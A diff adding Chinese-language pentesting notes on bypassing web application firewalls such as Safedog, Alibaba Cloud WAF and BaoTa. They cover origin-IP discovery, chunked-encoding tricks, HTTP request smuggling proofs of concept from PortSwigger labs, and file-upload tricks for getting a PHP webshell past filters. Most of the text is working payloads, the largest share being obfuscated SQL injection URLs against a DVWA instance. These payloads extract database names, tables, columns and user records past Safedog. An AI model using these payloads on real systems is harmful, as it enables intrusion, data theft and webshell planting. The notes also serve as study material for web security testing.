@@ -1,0 +1,742 @@
+
+常见waf：
+安全狗、云锁、D盾、阿里云、360安域、创宇盾、宝塔、玄武盾。
+
+waf分类：
+1.云waf：流量经过waf集群检测后再到达目标网站。如：阿里云防护、腾讯云防护、创宇云、加速乐等。
+特点：配置简单。使用者只需配置dns解析到云waf集群即可。
+2.主机防护软件：安全狗、云锁、D盾等。
+3.硬件防护：规则清洗、深度学习、语义分析等。
+
+
+识别各种waf的工具：
+https://github.com/stamparm/identYwaf
+https://github.com/Ekultek/WhatWaf
+
+
+bypass waf思路：
+1.架构层：主要用于绕过云waf.
+设置UA为搜索引擎的UA值，想办法获取目标真实ip、修改本地host文件直接解析到对应ip进行访问(不经过云waf)。
+利用同网段：如：买一台跟其在同一网段的ip机器。
+利用子站漏洞，如ssrf.
+FUZZ.
+
+
+2.协议层：硬件waf和主机防护软件waf：
+GET或POST方法相互转换。
+更改Content-Type：利用waf覆盖面缺陷。如：
+Content-Type: application/x-www-form-urlencoded;	更改为：
+Content-Type: multipart/form-data;
+使其以表单的方式提交：
+POST数据部分类似：
+---------------1s-----------------
+----wwezasdazz
+Content-Disposition: form-data; name="id"
+
+1 union /*!select*/ 1,2,3
+----wwezasdazz
+-------------1e------------------
+
+利用空格校验缺陷绕过：
+关键词加上空格或换行符。如：
+Content-Type: multipart/form-data; boundary:[空格]
+
+或filename="zqpz.php "
+
+
+
+3.容器层
+4.fuzz
+
+
+
+
+
+cdn：内容分发网络。需配置CNAME解析。
+
+A记录：将一个域名绑定到一个ip.
+CNAME：将一个域名映射到另一个域名。
+
+
+正向代理：代理主要架设在客户端。
+客户端--(客户端和代理信息互知)-->代理-->服务端
+
+反向代理：代理主要架设在服务器端。
+客户端-->代理--(服务端和代理信息互知)-->服务端
+
+
+
+
+
+http请求走私：主要就是利用中介或反向代理或前端服务器 与 后端服务器对相同请求的处理方式不同所导致。
+http反向代理服务器(或前置服务器)和http服务器(或后置服务器)对实现的Content-Length和Transfer-Encoding处理不一致所致。
+
+Content-Length：内容体(请求正文)的字节。
+Transfer-Encoding：使用分块编码或传输，以0\r\n\r\n为结束符。
+
+分块传输很可能绕过waf.
+
+
+在header头部加入Transfer-Encoding: chunked	
+则代表这个报文采用了分块编码传输。
+
+
+
+http请求走私：
+一般能绕过安全控制、未授权访问敏感数据。
+http规范提供了两种不同方式来指定请求的结束位置：Content-Length标头或Transfer-Encoding标头。
+当有TL时，则一般服务器端会忽略CL标志。
+特别注意：每一个分块的字节长度值必须以16进制的形式来表示，如：
+92个字节长度-->10进制为92，则16进制需表示为5c
+
+
+CL标志：服务器端直接根据CL的值(字节长度)来读取数据，判断请求的结束位置。
+如：
+-----------1s---------------------
+POST /search HTTP/1.1
+Host: normal-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+-----------------1e------------------
+
+
+\r\n计数为两个字节，表现为一个换行符。
+
+
+TE标志：即分块编码传输。
+
+
+
+
+
+每个分块包括长度和数据：
+每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括其结尾的CRLF(即\r\n)，
+也不包括分块数据最终结尾的CRLF
+最后一个分块长度值必须为0，再加上\r\n\r\n，表示实体结束。
+一个\r\n表示一个换行。
+说白了，分块传输的结束符为：一个结束符0再加上两个\r\n
+
+eg1：
+关闭burp的repeater的update Content-Length则服务器根据传入的Content-Length长度参数来读取数据(如：Content-Length: 6则只读6个字符)。
+
+
+分块传输：
+header添加
+Transfer-Encoding: chunked
+则服务器端就不依赖Content-Length来判断结尾，是根据最后的一个长度为0(结束符为0\r\n\r\n)来判断传输完毕。
+
+
+
+如：
+-----------1s---------
+POST /wz.php
+...
+...
+Transfer-Encoding: chunked
+
+2 			第一个分块长度为2
+id 			第一个分块的数据
+3
+=12
+3
+345
+0 			最后一个分块长度为0内容为空	0为结束符
+[第一个空行]			//\r\n 也就是一个换行符
+[第二个空行]			//\r\n 也就是一个换行符
+------------1e--------
+
+Connection: Keep-Alive
+用于维持长连接，不关闭tcp连接。故再次向同一服务器发起http请求只需进行一次tcp握手。
+且HTTP1.1有了Pipeline技术，可以让客户端批量发送http请求，无需等待服务器响应。
+
+
+
+CL：Content-Length
+TE：Transfer-Encoding
+
+走私也很可能绕过waf.
+常见http走私方式：
+1. CL不为0的GET请求：
+如：两个GET请求，前端服务器允许GET请求带正文，故默认会以CL来读取内容。若后端服务器不允许GET请求带正文，则会忽略掉CL，则会将其当作两个GET请求，进而处理第二个请求。
+eg1：
+-------------1s------------
+GET / HTTP/1.1\r\n
+Host: test.com\r\n
+Content-Length: 40\r\n 		
+
+GET /secret HTTP/1.1\r\n
+Host: test.com\r\n
+\r\n
+------------1e----------------
+
+2. CL-CL：
+前端服务器和后端服务器能同时接收多个Content-Length却不会返回400错误。
+如：前端服务器使用第一个Content-Length来判断数据结束位置，后端服务器使用第二个Content-Length来判断数据结束位置。
+eg1：
+------------1s---------------
+POST / HTTP/1.1\r\n
+Host: test.com\r\n
+Content-Length: 10\r\n
+Content-Length: 8\r\n
+
+123456\r\n
+Te
+------------1e---------------
+正常经过前端处理，后端处理却只读取了123456
+则Te两个字符被后端服务器放在缓冲中，直到遇到下一个请求，再将其拼接在一起。
+如：TePOST / HTTP/1.1...
+
+
+
+3. CL-TE漏洞：前端服务器使用CL来判断，后端服务器使用TE来判断(结束符：0\r\n\r\n)。
+eg1：
+----------1s-------------
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+---------------1e-----------
+则SMUGGLED被走私出来，后端服务器会将其放在自己的缓存中，当下一个请求来临时，将其拼接在下一个请求的前面。
+
+实验1：前端使用CL来判断，后端使用TE来判断。若要尝试此法走私，则一般需自己手动在头部中添加：
+Transfer-Encoding: chunked和Content-Length: 27
+长度burp会自动计算。
+一般首先会将其转为POST请求。
+
+
+https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
+eg1：
+poc1：有没有id这些等等参数完全无关系。
+----------1s------------------
+POST / HTTP/1.1
+Host: acad1f3c1fc6ebdfc0fa485100440030.web-security-academy.net
+Connection: close
+Cache-Control: max-age=0
+sec-ch-ua: "Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: session=8F3lgooAM51dbE5NUnlabqHXiw9g1hBq
+Content-Length: 27
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+
+2 				//第一个分块的字节长度
+id 				//第一个分块的数据部分
+3 				//第二个分块的字节长度
+=16 			//第二个分块的数据部分
+0 				//理解为最后一个分组长度为0或分块传输以0\r\n\r\n为结束标识符来判断。
+
+G 				//这部分(G)则被走私出来，放在后端服务器的缓存中，和下一个请求拼接在一起。
+------------1e------------------
+拼接后如：
+-----------1s------------
+GPOST / HTTP/1.1
+...
+...
+-------------1e------------
+
+返回"Unrecognized method GPOST"
+故走私成功。
+或poc2：
+------------1s-----------
+POST / HTTP/1.1
+Host: acde1fca1f2d7132c08c07ca00c10099.web-security-academy.net
+Connection: close
+Cache-Control: max-age=0
+sec-ch-ua: "Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: session=igBochP9LkrtcsmBBpzrWU7rjcRY84Xk
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+G
+-----------------1e---------
+
+
+4. TE-CL漏洞：前端服务器使用TE来判断(结束符：0\r\n\r\n)来判断，后端服务器使用CL来判断。
+eg1: 确保burp的repeate未选中"Update Content-Length"选项.
+-----------1s---------
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8 					//SMUGGLED的字节长度为8
+SMUGGLED 			//则SMUGGLED和剩下的部分就被走私出来。
+0
+
+
+------------1e-------
+实验2：TE-CL方式。
+https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
+
+
+poc1：
+---------------1s-------------
+POST / HTTP/1.1
+Host: ac531f711fff3430c072adf200440066.web-security-academy.net
+Connection: close
+Cache-Control: max-age=0
+sec-ch-ua: "Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: session=7Wfh8FdOgkt1FwPcb3YVMZ3l2ksj0x0Q
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqTiSuzmiykKI3kyI
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c 							//G字符到x=1的1字符 长度为92 必须以16进制形式表示
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded 	//最好一般加上这条
+Content-Length: 15 			//这里长度无所谓随便写。
+
+x=1
+0 							//0\r\n\r\n表示分块传输的结束标志。
+
+
+---------------1e---------------
+或许是因为有pipleline，故服务器端直接处理第二个请求，自然出现：
+"Unrecognized method GPOST"
+走私成功。
+
+
+5. TE-TE方式：
+实验3：TE-TE混淆方式。
+https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header
+
+前端和后端服务器都支持Transfer-Encoding标头，却可以通过某种方式混淆标头来诱导其中一台服务器不处理它。
+混淆方式包括不仅限于：
+--------------1s--------
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+-----------------1e---------
+挖掘此种漏洞的核心：
+找到关于Transfer-Encoding的一些变体，使得只有其中一台会处理它，而另一条服务器会忽略它。
+
+poc1:
+------------1s---------------
+POST / HTTP/1.1
+Host: ac461f7e1f0c68d5c0918d19002c00ac.web-security-academy.net
+Connection: close
+Cache-Control: max-age=0
+sec-ch-ua: "Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: session=NFuYCD1jWxJbwbdoXTOXgkn97WFsDhuP
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow 				//cow为自定义字符，随便写
+
+5c
+GPOST / HTTP/1.1 				//其中G字符为自定义的
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1 			//类似于第二个POST的数据部分
+0
+
+
+----------------1e----------
+分析：
+前端可能使用第一个TE(Transfer-Encoding: chunked)来判断，故即使有CL值，一般也会忽略的。 通过前端;
+后端服务器使用第二个TE(Transfer-encoding: cow)来判断，发现TE值没法识别或处理，故只好去根据CL值来处理。
+走私成功。
+
+
+GET方式一般不能分块传输。
+
+使用burp的分块传输，可能绕过waf.
+其中一种特殊方式类似：
+-------------1s--------------
+
+3;sadwdz
+sju
+6;sdfdgfdg
+123432
+0
+
+
+----------------1e-------------
+
+
+协议层绕过waf：
+1.利用：
+Connection: keep-alive
+eg1:
+-------------1s--------------
+GET /calc.php?a=343&b=6 HTTP/1.1
+Host: kwz.com
+Connection: keep-alive
+Max-Forwards: 0
+Content-Length: 0
+
+GET /calc.php?a=326&b=6 HTTP/1.1
+Host: kwz.com
+Connection: keep-alive
+Max-Forwards: 0
+Content-Length: 0
+----------------1e-------------
+则服务器会很可能会处理第二个请求(因为keep-alive)。
+核心：利用keep-alive 直接同时发送2个请求，会被处理。
+
+TRACE方法，即服务器返回的响应正文部分就是请求体的内容，常用于挖掘xss.
+TRACE方法不受HttpOnly的限制，读取Cookie等。
+
+
+使用TRACE或OPTIONS方法时，发送若带有Max-Forwards字段，该字段以十进制表示可经过的服务器最大数目(经过一个减1)，当服务器端接收到Max-Forwards: 0时，则不再进行转发，直接返回响应。
+
+
+2.发送超大型HTTP请求包：利用某些waf或服务器容载过小无法处理。
+eg1：
+--------------1s---------------------
+-------webkiezzkkwdzz
+5w个字符 如(xxxxx...)
+Content-Disposition: form-data; name="FileName"; filename="z.php"
+Content-Type: image/jpeg
+
+木马code
+-------webkiezzkkwdzz
+--------------1e---------------------
+
+
+容器层：利用各种容器的特性。
+1.特殊的百分号：
+在IIS+ASP环境中，对于url请求中的%，或和后面的字符拼接 在url编码表之外，则asp脚本处理时会将其忽略。
+如：
+http://wdzz.com/q.asp?id=1 union sele%ct 1,2,3,4 fr%om admi%n
+2. unicode编码：
+IIS支持unicode编码的解析，某些waf不一定支持。
+unicode编码表：https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%88%97%E8%A1%A8
+编码解码地址：
+https://tool.chinaz.com/tools/unicode.aspx
+
+如：
+S的unicode编码为：%u0053或\u0053
+f的unicode编码为：%u0066或\u0066
+
+http://wdzz.com/q.asp?id=1 union %u0053elect 1,2,3,4 %u0066rom admin
+
+
+安全部署一般都是业务第一、安全第二。
+则hacker(Z)就可利用这个漏洞。
+
+3.http参数污染：即类似同名参数出现多次。
+如：
+asp+iis：id=1,2,3
+php+apache/nginx：id=3 	注：若提交id=1,2,3则php+apache/nginx好像是取id=3
+php+apache/nginx：id=3&id=8
+
+
+http://wdzz.com/q.asp?id=1&id=6
+
+
+
+eg1：
+id=union+select+passwd+/*&id=*/from+admin
+绕过某些规则。
+
+iis+asp/asp.net：
+id=union+select+passwd/*,*/from+admin	绕过某些规则。
+
+4.畸形http：
+web服务器面对一些畸形的非标准规范的http请求时，一般会尽量解析畸形的http请求。
+可能bypass.
+
+eg1:
+--------------1s-----------------
+POST wz.php?id=1%20union/**/select/**/1,2,3/**/from/**/admin HTTP/1.1
+Host 43.56.78.6
+...
+...
+
+YxSb wz.php?id=1%20union/**/select/**/1,2,3/**/from/**/admin HTTP/1.1
+Host 43.56.78.6
+...
+...
+----------------1e-----------------------
+同时发送两个包，因为会尽可能解析畸形请求，故可能bypass
+
+
+5.FUZZ
+(1)空格转义：特殊字符代替空格。
+各个数据库允许的空格符有：
+sqlite3		0A,0D,0C,09,20
+mysql5		09,0A,0B,0C,0D,A0,20
+ORACLE 11G	00,09,0A,0B,0C,0D,20
+MSSQL 2008	01,02....到09都是,0A,0B到0F都是,10到19都是,1A,1B,1C,1D,1E,1F,20,25
+
+(2)特殊字符组合干扰：
+注释符：#、--+、/*XXX*/、/*!XXX*/、/*!50000XXX*/
+注：如mysql>=5版本，则类似/*!50000XXX*/的XXX部分的语句就会执行。
+空白符：%09,%0A,%0B,%0C,%0D,%20,%A0,/**/
+函数分隔符：综合利用、各种组合。 如：user%23%0a(/*aaa*/)
+特殊符号：+ << >> @`` \n 3e1 emoji表情 @:=等
+
+(3)字符编码：
+常见sql编码有：unicode、HEX、url、ascii、base64等。
+xss编码有：html、url、ascii、js编码、base64等。
+(4)大小写转换。
+如sql语句或xss语句。
+
+
+阿里云waf需要修改UA为搜索引擎.
+最好写脚本各种组合随机测试。
+
+宝塔一般需要关键词加注释符fuzz绕过。
+
+/*!union 	可以执行
+/*!union*/	可以执行
+/*wdzqd*/	注释符，能代替空格
+最好本地sql执行测试一下。
+
+
+能绕过5.7
+select user,password from users where/*wdd*/user_id='3' /*!union*//*!999999/*/**/*!*//*!30440select*/ /*!10440user*//*!60000/*/*/*-*//*!()*/,2-- ;
+其中/*!60000/为内联注释，6意思是必须>版本号，即mysql的版本号>6才会执行。
+/*!30440select*/，3意思是必须<版本号，即mysql的版本号>3才会执行。
+一般都取5位.  或者直接fuzz.
+
+
+
+绕waf就是要测试它的rules. 一般采用删减法。
+
+sql注入绕过waf.
+思路：
+混淆(手工或脚本)：收集的payload随机组合、大小写、注释符、编码等，fuzz.
+技巧：填充垃圾数据、更改请求方式、分块传输、参数五日、修改客户端ip(XFF等).
+WAF 0day：利用waf本身的缺陷.
+
+
+绕过安全狗：
+查当前用户：
+http://192.168.88.134:81/dvwa/vulnerabilities/sqli/?id=2' /*!union*//*!80000/*/**/*!*//*!10440select*/ /*!10440user*//*!80000/*/*/*?*//*!()*/,2--+&Submit=Submit
+
+查数据库名：
+http://192.168.88.134:81/dvwa/vulnerabilities/sqli/?id=2%27%20/*!union*//*!80000/*/**/*!*//*!10440select*/%20/*!10440database*//*!80000/*/*/*?*//*!()*/,2--+&Submit=Submit
+
+
+安全狗最新2021.10.17绕过：若没手动开启POST拦截则一般不会拦截POST请求。
+mysql5.7：这个版本获取表什么的暂时没找到方法。
+获取当前数据库名：
+http://192.168.88.134:81/dvwa/vulnerabilities/sqli/?id=-1%27%20/*!union*//*!80000/*/**/*!*//*!10440select*/%20/*!10440database*//*!80000/*/**/%0c*//*!()*/,2--+&Submit=Submit
+
+获取当前用户名：
+http://192.168.88.134:81/dvwa/vulnerabilities/sqli/?id=-1%27%20/*!union*//*!80000/*/**/*!*//*!10440select*/%20/*!10440user*//*!80000/*/**/%0c*//*!()*/,2--+&Submit=Submit
+
+/*!80000/为：若mysql版本号>=8则会执行，否则将其当作注释，不执行。
+
+mysql8.0：
+获取当前数据库名：
+http://192.168.88.134:81/dvwa/vulnerabilities/sqli/?id=-1%27%20/*!union*//*!90000/*/**/*!*//*!10440select*/%20/*!10440database*//*!90000/*/**/%0c*//*!()*/,2--+&Submit=Submit
+
+获取当前用户名：
+http://192.168.88.134:81/dvwa/vulnerabilities/sqli/?id=-1%27%20/*!union*//*!90000/*/**/*!*//*!10440select*/%20/*!10440user*//*!90000/*/**/%0c*//*!()*/,2--+&Submit=Submit
+
+获取所有数据库名：
+id=-1%27%20/*!union*//*!90000/*/**/*!*//*!10440select*/%20/*!10440user*//*!90000/*/**/%0c*//*!()*/,(/*!10440select*/%20group_concat(/*!schema_name*/)%20from%20information_schema.schemata)--+&Submit=Submit
+
+获取当前数据库下的所有表名：
+id=-1%27%20/*!union*//*!90000/*/**/*!*//*!10440select*/%20/*!10440user*//*!90000/*/**/%0c*//*!()*/,(/*!10440select*/%20group_concat(/*!table_name*/)%20from%20information_schema.tables)--+&Submit=Submit
+或：
+id=-1%27%20/*!union*//*!90000/*/**/*!*//*!10440select*/%20/*!10440user*//*!90000/*/**/%0c*//*!()*/,(/*!10440select*/%20substr((group_concat(/*!table_name*/)),1,10)%20from%20information_schema.tables)--+&Submit=Submit
+或：
+id=-1%27%20/*!union*//*!90000/*/**/*!*//*!10440select*/%20/*!10440user*//*!90000/*/**/%0c*//*!()*/,(/*!10440select*/%20substr((group_concat(/*!table_name*/)),1,100)%20from%20information_schema.tables%20where%20table_name%20like%20'users')--+&Submit=Submit
+或：
+id=-1%27%20/*!union*//*!90000/*/**/*!*//*!10440select*/%20/*!10440user*//*!90000/*/**/%0c*//*!()*/,(/*!10440select*/ group_concat(/*!table_name */)%20from%20information_schema.tables where table_schema='root')--+&Submit=Submit#
+
+
+
+
+获取字段名：
+id=-1%27%20/*!union*//*!90000/*/**/*!*//*!10440select*/%20/*!10440user*//*!90000/*/**/%0c*//*!()*/,(/*!10440select*/%20group_concat(/*!column_name*/)%20from%20information_schema.columns%20where%20table_name='users')--+&Submit=Submit
+
+获取数据：
+id=-1%27%20/*!union*//*!90000/*/**/*!*//*!10440select*/%20/*!10440user*//*!90000/*/**/%0c*//*!()*/,(/*!10440select*/%20group_concat(/*!user*/)%20from%20users)--+&Submit=Submit
+或：
+id=-1%27%20/*!union*//*!90000/*/**/*!*//*!10440select*/%20/*!10440user*//*!90000/*/**/%0c*//*!()*/,(/*!10440select*/%20group_concat(/*!user*/)%20from%20root.users)--+&Submit=Submit
+其中root为数据库名。
+
+
+
+
+
+文件上传bypass waf：
+1.填充垃圾字符：
+如：
+Content-Disposotion: form-data;大量垃圾字符;
+name="uploaded";filename="testz.php"
+2.文件名增加多个等号：
+name="uploaded";filename==="testz.php"
+3.参数污染：
+filename=;filename="testz.php"
+4. 00%截断：
+最好统一使用16进制来设置00截断.
+如：
+filename=;filename="testz.phpw"
+hex下将w字符对应的hex改为00
+
+经测试：00%截断可以绕过安全狗，但必须是一个免杀马，不然即使上传成功，执行也会被安全狗拦截.
+
+
+技巧法：
+1.GET和POST请求相互转换。
+
+2.填充垃圾数据：waf可能有缓存限制.
+如：
+id=1&Submit=Submit变为：
+垃圾字符&id=1&Submit=Submit
+eg1：
+POST的数据为：
+--------------1s------------------
+SbNooOTYQbTEHxO=ZtiQBRoSACoWKGcamEVFHZq&NDxZsoVfqa=ZavzEMQSJlThOZKXMSvdgJdp&ucgZtgo=PjaMvMzUTZnjZCbARiKIL&bhlceUjqevw=sAgmBnTmxwvKNRLqeVtm&FLlHTQsZVTlME=QrqwzkUNptSGbWhqNySqWoK&aeQiUF=QUgiiDgORZiXKLMyILKn&SyonC=wPysubrASxYiBCTnoRCpA&EaQUEoFg=etvcYuUJcnsOKlpEJczOYPpH&TNfWu=jtSGmojsUVJkuFNncnFfcFJiG&pTAeSguoLnlRk=uGiFOqOhHHxsoqBPaTnafmiv&WQWBsGGKj=WhBiIosbVUqgEkXnzmxkRj&LsKaxxxBSmk=ppmxMYsDwPsheIaqlaAZ&mIuwJQ=LNteorrxMbXbBdHotUDDNV&acaYWPcV=zRnrsurzmLBxKDSvpWCGfvwy&tWdllVTdSuZLK=YFzeFphCPagmLSOFWiEGq&cCggIh=ksVixgvDJTpsRQDPnloF&CAuYJaoDMc=UDYoZeLyUDBdTHMjkOFvGyJZZ&AbNwKVg=lmBFtweAxltcQXrIEgTZtOPl&khvLSfs=uQapOZTiOTLDzHlEMLjHxj&UxQVaNRgyQQVGEa=fqUvkwRECVSQTJsuwPbydyv&QUVceaFiMlDvv=NrdbYkXKURoYZxGxOXTCpli&LvChdQDvaJXpY=bBDTglWWSzFKmbGROsEIkwslj&YashN=YGbouDAbOqgnKExWFDygx&CLVdBJQj=ZpbqnhANZKoVQXydoVvJAGHg&phedABErrg=aryXAkSkyOGlLVGuUXFZKYYZA&fWKAQPpuZHgv=qhodwZDoDepiUrtuiAyfpv&ezJPxL=vOCYWPcLPtvDaJJozyZXU&janGXeJBEDz=dCcupMqvjNofTluMzdKoTfrFs&VaweOGqUgy=burDOJUCwTWrYpIjoPHAy&dczuMKHNC=vtHWEjVdfluHXkdgpnxDbzUpm&XEvPexhJE=fTLlIwPxoLunfgqHYoPrE&afcARihJh=LdyZfBMqeQOlWXtAyhdyxsKx&nGdplVIWIZ=eaxGDoCfdMmTeRyrDDoATkGQH&kCrSD=txmXPFruOFrnMOZugddSXF&GMJooCmBF=PQYhihDJXneNSragkRnUJbD&PgNOkGtMxJM=pEbrxsQOBUnCnoEpuxgm&EWQaVND=yjCjXEhXznaOdMcGTCCknafyj&jQZYCA=REojoXWXNYpAmqJDIjkHMdp&iXJpAgBEMxQgJsP=DnJusjYazOunsQJgPZAG&FfjadCP=xqlEKpdsveBksboPGiCROVNk&hAUMWi=QahKuePLwWpiGslyfQuSql&csbDRcrcncX=LeBiKAOtSPFybyCPiHQsT&fzAcEMIS=whxQeOUxVNzYfwOsAMbxy&wRBGRlNhdVNTQ=HnDemTLxPWBwiLBIYtAEnbVA&
+&SbNooOTYQbTEHxO=ZtiQBRoSACoWKGcamEVFHZq&NDxZsoVfqa=ZavzEMQSJlThOZKXMSvdgJdp&ucgZtgo=PjaMvMzUTZnjZCbARiKIL&bhlceUjqevw=sAgmBnTmxwvKNRLqeVtm&FLlHTQsZVTlME=QrqwzkUNptSGbWhqNySqWoK&aeQiUF=QUgiiDgORZiXKLMyILKn&SyonC=wPysubrASxYiBCTnoRCpA&EaQUEoFg=etvcYuUJcnsOKlpEJczOYPpH&TNfWu=jtSGmojsUVJkuFNncnFfcFJiG&pTAeSguoLnlRk=uGiFOqOhHHxsoqBPaTnafmiv&WQWBsGGKj=WhBiIosbVUqgEkXnzmxkRj&LsKaxxxBSmk=ppmxMYsDwPsheIaqlaAZ&mIuwJQ=LNteorrxMbXbBdHotUDDNV&acaYWPcV=zRnrsurzmLBxKDSvpWCGfvwy&tWdllVTdSuZLK=YFzeFphCPagmLSOFWiEGq&cCggIh=ksVixgvDJTpsRQDPnloF&CAuYJaoDMc=UDYoZeLyUDBdTHMjkOFvGyJZZ&AbNwKVg=lmBFtweAxltcQXrIEgTZtOPl&khvLSfs=uQapOZTiOTLDzHlEMLjHxj&UxQVaNRgyQQVGEa=fqUvkwRECVSQTJsuwPbydyv&QUVceaFiMlDvv=NrdbYkXKURoYZxGxOXTCpli&LvChdQDvaJXpY=bBDTglWWSzFKmbGROsEIkwslj&YashN=YGbouDAbOqgnKExWFDygx&CLVdBJQj=ZpbqnhANZKoVQXydoVvJAGHg&phedABErrg=aryXAkSkyOGlLVGuUXFZKYYZA&fWKAQPpuZHgv=qhodwZDoDepiUrtuiAyfpv&ezJPxL=vOCYWPcLPtvDaJJozyZXU&janGXeJBEDz=dCcupMqvjNofTluMzdKoTfrFs&VaweOGqUgy=burDOJUCwTWrYpIjoPHAy&dczuMKHNC=vtHWEjVdfluHXkdgpnxDbzUpm&XEvPexhJE=fTLlIwPxoLunfgqHYoPrE&afcARihJh=LdyZfBMqeQOlWXtAyhdyxsKx&nGdplVIWIZ=eaxGDoCfdMmTeRyrDDoATkGQH&kCrSD=txmXPFruOFrnMOZugddSXF&GMJooCmBF=PQYhihDJXneNSragkRnUJbD&PgNOkGtMxJM=pEbrxsQOBUnCnoEpuxgm&EWQaVND=yjCjXEhXznaOdMcGTCCknafyj&jQZYCA=REojoXWXNYpAmqJDIjkHMdp&iXJpAgBEMxQgJsP=DnJusjYazOunsQJgPZAG&FfjadCP=xqlEKpdsveBksboPGiCROVNk&hAUMWi=QahKuePLwWpiGslyfQuSql&csbDRcrcncX=LeBiKAOtSPFybyCPiHQsT&fzAcEMIS=whxQeOUxVNzYfwOsAMbxy&wRBGRlNhdVNTQ=HnDemTLxPWBwiLBIYtAEnbVA&cjuvHusfDcx=NSDOkUzIeNguMkRwBMkJCFjC&
+&SbNooOTYQbTEHxO=ZtiQBRoSACoWKGcamEVFHZq&NDxZsoVfqa=ZavzEMQSJlThOZKXMSvdgJdp&ucgZtgo=PjaMvMzUTZnjZCbARiKIL&bhlceUjqevw=sAgmBnTmxwvKNRLqeVtm&FLlHTQsZVTlME=QrqwzkUNptSGbWhqNySqWoK&aeQiUF=QUgiiDgORZiXKLMyILKn&SyonC=wPysubrASxYiBCTnoRCpA&EaQUEoFg=etvcYuUJcnsOKlpEJczOYPpH&TNfWu=jtSGmojsUVJkuFNncnFfcFJiG&pTAeSguoLnlRk=uGiFOqOhHHxsoqBPaTnafmiv&WQWBsGGKj=WhBiIosbVUqgEkXnzmxkRj&LsKaxxxBSmk=ppmxMYsDwPsheIaqlaAZ&mIuwJQ=LNteorrxMbXbBdHotUDDNV&acaYWPcV=zRnrsurzmLBxKDSvpWCGfvwy&tWdllVTdSuZLK=YFzeFphCPagmLSOFWiEGq&cCggIh=ksVixgvDJTpsRQDPnloF&CAuYJaoDMc=UDYoZeLyUDBdTHMjkOFvGyJZZ&AbNwKVg=lmBFtweAxltcQXrIEgTZtOPl&khvLSfs=uQapOZTiOTLDzHlEMLjHxj&UxQVaNRgyQQVGEa=fqUvkwRECVSQTJsuwPbydyv&QUVceaFiMlDvv=NrdbYkXKURoYZxGxOXTCpli&LvChdQDvaJXpY=bBDTglWWSzFKmbGROsEIkwslj&YashN=YGbouDAbOqgnKExWFDygx&CLVdBJQj=ZpbqnhANZKoVQXydoVvJAGHg&phedABErrg=aryXAkSkyOGlLVGuUXFZKYYZA&fWKAQPpuZHgv=qhodwZDoDepiUrtuiAyfpv&ezJPxL=vOCYWPcLPtvDaJJozyZXU&janGXeJBEDz=dCcupMqvjNofTluMzdKo